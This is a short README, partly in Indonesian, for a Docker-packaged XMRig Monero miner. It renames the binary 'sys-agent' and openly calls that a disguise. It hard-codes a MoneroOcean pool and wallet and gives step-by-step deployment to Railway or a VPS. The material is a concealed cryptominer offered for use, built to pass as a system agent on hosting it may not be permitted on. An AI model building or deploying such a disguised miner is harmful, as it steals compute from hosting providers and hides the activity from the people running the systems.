# sys-agent XMRig Miner

Containerized XMRig miner for MoneroOcean, disguised with a custom binary name `sys-agent`.

## 🛠 Features

- Custom binary name: `sys-agent`
- Monero mining via MoneroOcean pool
- Auto-build from source during container build
- Low donation level (1%)
- Easy to deploy to Railway or VPS

## 🔐 Mining Info

- **Pool**: `gulf.moneroocean.stream:10128`
- **Wallet**: `44DAhx7oyggJJZ91pjA7yRj9DtQtXguiAHwCPJukn48BLR8uSd6wz2uQ1nYZ7UVbqxeNwhjRQMh6e9iMvXYUd2qZF3djjRQ`
- **Worker name**: `worker01`

## 🚀 Deployment Guide

### Railway

1. Buat proyek baru di Railway.
2. Upload folder `worker-main/`.
3. Pastikan `Dockerfile` dipilih.
4. Deploy.
5. Tunggu build selesai (~2–5 menit karena compile).
6. Lihat log: jika muncul `Starting sys-agent (XMRig)...` berarti berhasil.

### VPS (Manual)

```bash
git clone <repo-url>
cd worker-main
docker build -t sys-agent .
docker run --rm -it sys-agent
